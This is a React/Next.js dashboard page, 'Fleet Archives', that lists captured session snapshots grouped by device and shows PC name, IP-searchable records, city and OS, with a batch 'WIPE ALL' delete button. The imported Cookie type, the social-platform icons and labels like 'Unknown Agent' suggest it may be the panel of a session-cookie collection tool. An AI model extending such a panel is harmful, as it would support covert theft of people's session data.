"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2
} from "lucide-react";
import { motion } from "framer-motion";
import Link from "next/link";

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [deleteProgress, setDeleteProgress] = useState("");

  useEffect(() => {
    fetchSessions();
  }, []);

  const fetchSessions = async () => {
    setLoading(true);
    const { data } = await supabase.from("session_snapshots").select("*").order("captured_at", { ascending: false }).limit(500);
    if (data) setSessions(data);
    setLoading(false);
  };

  const deleteAllData = async () => {
    if (!window.confirm("⚠️ ¿ESTÁS SEGURO? Esta acción vaciará por lotes TODA la base de datos de manera irreversible.")) return;
    setLoading(true); setDeleteProgress("PREPARANDO...");
    try {
      const { data: allIds } = await supabase.from("session_snapshots").select("id");
      if (allIds && allIds.length > 0) {
        const ids = allIds.map(i => i.id);
        const batchSize = 100;
        for (let i = 0; i < ids.length; i += batchSize) {
          const chunk = ids.slice(i, i + batchSize);
          setDeleteProgress(`LIMPIANDO: ${Math.min(i + batchSize, ids.length)} / ${ids.length}...`);
          await supabase.from("session_snapshots").delete().in("id", chunk);
        }
      }
      alert("✅ Base de datos vaciada.");
      setSessions([]);
    } catch (err: any) { alert("Error: " + err.message); }
    finally { setLoading(false); setDeleteProgress(""); fetchSessions(); }
  };

  const grouped = sessions.reduce((acc: any[], s) => {
    const dId = s.device_id || "unknown";
    if (!acc.find(d => d.id === dId)) {
      const dSess = sessions.filter(x => x.device_id === dId);
      acc.push({ id: dId, latest: dSess[0], count: dSess.length });
    }
    return acc;
  }, []);

  const filtered = grouped.filter(d => 
    (d.latest.pc_name || "").toLowerCase().includes(searchTerm.toLowerCase()) ||
    (d.latest.ip_address || "").includes(searchTerm)
  );

  return (
    <div className="space-y-8 max-w-7xl mx-auto px-6">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
        <div>
          <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Fleet Archives</h2>
          <p className="text-gray-500 font-bold tracking-wide mt-1 uppercase text-xs">Total Devices: {grouped.length}</p>
        </div>
        <div className="flex items-center gap-4">
          <div className="glass flex items-center px-6 py-3.5 rounded-2xl border border-white/5 w-80">
            <Search className="text-gray-500 mr-4" size={20} />
            <input type="text" placeholder="Search Fleet..." className="bg-transparent border-none outline-none text-[10px] w-full placeholder:text-gray-600 font-black uppercase text-white" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
          </div>
          <button onClick={deleteAllData} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-red-500/20 font-black text-[10px] uppercase text-red-500 hover:bg-red-500/10 transition-all">
            <Trash2 size={20} /> {deleteProgress || "WIPE ALL"}
          </button>
        </div>
      </header>

      {loading ? (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          {[1,2,3].map(i => <div key={i} className="h-64 glass rounded-[3rem] animate-pulse" />)}
        </div>
      ) : (
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
          {filtered.map(device => (
            <Link key={device.id} href={`/device/${device.id}`}>
              <motion.div whileHover={{ y: -10 }} className="glass-intense p-10 rounded-[3rem] border border-white/5 hover:border-blue-500/20 cursor-pointer shadow-2xl transition-all group">
                <div className="flex justify-between items-start mb-8">
                  <div className="space-y-4">
                    <div className="p-6 rounded-[2rem] bg-blue-500/10 text-blue-400 border border-blue-500/10 group-hover:scale-110 transition-transform shadow-lg"><Monitor size={40} /></div>
                    <div>
                      <h4 className="text-2xl font-black text-white">{device.latest.pc_name || "Unknown Agent"}</h4>
                      <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-widest">{device.latest.location_city || "Remote"}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="text-[10px] font-black text-emerald-400 flex items-center gap-2 justify-end tracking-tighter"><div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"/>LIVE</div>
                    <p className="text-[9px] font-black text-gray-700 uppercase mt-2 tracking-widest">{device.latest.os}</p>
                  </div>
                </div>
                <div className="bg-black/20 rounded-3xl p-5 border border-white/5 flex justify-between items-center">
                   <div className="text-[9px] font-black text-gray-500 uppercase tracking-widest">Active Archives</div>
                   <div className="px-4 py-1.5 rounded-full bg-blue-500/10 text-blue-400 font-black text-[10px] uppercase border border-blue-500/10">{device.count} SESSIONS</div>
                </div>
              </motion.div>
            </Link>
          ))}
        </div>
      )}
    </div>
  );
}
